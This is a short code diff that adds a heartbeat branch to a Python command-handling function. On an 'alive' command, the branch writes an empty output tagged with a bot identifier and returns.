@@ -55,7 +55,10 @@ def do_command(conn, counter, row):
         # command end
         elif parts[4] == "happy":
             exit("Good bye")
-        # TODO alive
+        # heartbeat
+        elif parts[4] == "alive":
+            write_output(conn, counter, BOT_ID, "")
+            return
 
     print("recognized command:", command)
 
